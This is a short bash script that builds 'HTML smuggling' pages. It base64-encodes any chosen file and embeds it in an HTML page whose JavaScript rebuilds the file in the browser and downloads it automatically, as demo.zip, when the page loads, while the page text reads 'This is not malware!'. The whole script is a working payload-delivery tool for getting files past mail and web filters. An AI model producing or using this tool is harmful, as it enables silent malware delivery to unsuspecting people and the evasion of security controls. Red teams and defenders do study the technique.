#!/usr/bin/env bash

file="$1"

#Function to create the HTML file

create_html_file() {
    local b64="$1"
    local file_name="$2"
    local content="<!DOCTYPE html>
<html>
    <head>
        <title>HTML Smuggling</title>
    </head>
    <body>
        <p>This is not malware!</p>

        <script>
        function convertFromBase64(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array( len );
            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
            return bytes.buffer;
        }

        var file = '$b64';
        var data = convertFromBase64(file);
        var blob = new Blob([data], {type: 'octet/stream'});
        var fileName = 'demo.zip';

        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
        else {
            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = fileName;
            a.click();
            window.URL.revokeObjectURL(url);
        }
        </script>
    </body>
</html>"

    echo "$content" > "$file_name.html"
    echo "HTML Smuggling file '$file_name.html' created successfully!"
}

# Check if a filename is provided as an argument or using -o option
if [ $# -eq 0 ]; then 
    echo "Usage:"
    echo "./smuggle.sh <file> <filename>"
    echo "./smuggle.sh <file> -o <filename>"
    exit 0
elif [ $# -eq 1 ]; then
    # Default filename
    file_name="smuggle"
else
    # Check if -o option is used and get the custom filename
    if [ "$2" = "-o" ] && [ $# -ge 3 ]; then
        file_name="$3"
    else
        file_name="$2"
    fi
fi

#transform the file to b64
b64=$(cat "$file" | base64 | tr -d '\n')

#Call the function to create the HTML file
create_html_file "$b64" "$file_name"
